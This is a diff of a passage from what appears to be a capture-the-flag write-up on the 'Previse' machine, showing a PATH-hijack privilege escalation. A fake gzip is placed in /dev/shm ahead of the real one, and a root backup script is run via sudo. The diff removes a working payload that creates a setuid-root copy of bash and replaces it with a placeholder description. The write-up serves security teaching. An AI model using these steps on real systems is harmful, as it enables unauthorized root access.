@@ -164,7 +164,7 @@ So you write a fake `gzip`, put its folder at the front of PATH, and let the roo
 
 ```
 m4lwhere@previse:~$ cd /dev/shm
-m4lwhere@previse:/dev/shm$ printf '#!/bin/bash\ncp /bin/bash /tmp/iceberg\nchmod 4755 /tmp/iceberg\n' > gzip
+m4lwhere@previse:/dev/shm$ printf '[ a #!/bin/bash script that copies /bin/bash to /tmp/iceberg and sets it setuid-root ]' > gzip
 m4lwhere@previse:/dev/shm$ chmod +x gzip
 m4lwhere@previse:/dev/shm$ export PATH=/dev/shm:$PATH
 m4lwhere@previse:/dev/shm$ sudo /opt/scripts/access_backup.sh
